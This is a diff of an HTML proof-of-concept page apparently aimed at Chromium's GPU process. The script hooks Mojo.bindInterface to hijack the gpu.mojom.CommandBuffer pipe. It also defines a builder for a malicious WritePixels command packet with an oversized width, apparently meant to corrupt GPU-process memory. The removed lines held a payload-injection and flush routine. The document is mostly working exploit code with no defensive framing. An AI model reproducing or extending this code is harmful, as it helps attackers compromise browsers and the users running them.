@@ -3,39 +3,44 @@
 <body>
     <canvas id="target-canvas" width="10" height="10"></canvas>
     <script>
-        // Use a Proxy to monitor the Mojo interface
+        // 1. Hook MUST be synchronous and defined before any canvas code
         const originalBind = Mojo.bindInterface;
         Mojo.bindInterface = function(name, pipe, context) {
-            console.log("Interface requested: " + name);
+            console.log("[!] Interface requested: " + name);
             if (name === "gpu.mojom.CommandBuffer") {
-                console.log("[+] Hijacking CommandBuffer pipe!");
-                // We could intercept here, but let's just let it bind
-                // and then we will look for the ring buffer memory
+                console.log("[+] CAUGHT IT! Hijacking CommandBuffer pipe!");
+                // Here we could wrap the pipe if we wanted to
             }
             return originalBind.apply(this, arguments);
         };
-        function injectPayload(buffer, shm_id, mailbox) {
-            console.log("[!] Injecting payload into buffer...");
-            // 60-byte binary packet
-            const payload = buildMaliciousWritePixels(shm_id, mailbox); 
-            
-            // Write directly into the mapped buffer
-            buffer.set(payload, 0); 
-            
-            console.log("[+] Payload written. Triggering flush...");
-            // Triggering the flush tells the GPU process to start parsing the buffer
-            // command_buffer_proxy.flush(60); 
+
+        // 2. Helper to build the malicious packet
+        function buildMaliciousWritePixels(shm_id) {
+            const CMD_ID = 277; 
+            const WORDS = 15;
+            let buffer = new ArrayBuffer(WORDS * 4);
+            let dv = new DataView(buffer);
+            dv.setUint32(0, (WORDS << 21) | CMD_ID, true);
+            dv.setInt32(4, 0, true);   // x
+            dv.setInt32(8, 0, true);   // y
+            dv.setUint32(12, 0x20000000, true); // Width
+            dv.setUint32(16, 1, true); // Height
+            dv.setUint32(20, 0, true); // RowBytes
+            dv.setUint32(24, 4, true); // colorType
+            dv.setUint32(28, 2, true); // alphaType
+            dv.setInt32(32, shm_id, true); // shm_id (usually 1)
+            dv.setUint32(36, 0, true); // shm_offset
+            dv.setUint32(40, 0, true); // pixels_offset
+            let u8_view = new Uint8Array(buffer);
+            u8_view.fill(0, 44, 60);
+            return u8_view;
         }
 
-        // Standard canvas init triggers the IPC
-        setTimeout(() => {
-            const ctx = document.getElementById('target-canvas').getContext('2d');
-            ctx.fillRect(0,0,10,10);
-            
-            // Now, we would typically scan the process memory for the 
-            // shared memory region associated with this canvas.
-            console.log("[?] Interception successful. Now ready to inject WritePixelsINTERNAL...");
-        }, 500);
+        // 3. Trigger the canvas
+        const ctx = document.getElementById('target-canvas').getContext('2d');
+        ctx.fillRect(0,0,10,10);
+        
+        console.log("[?] Interception active. Check console for interface logs.");
     </script>
 </body>
 </html>
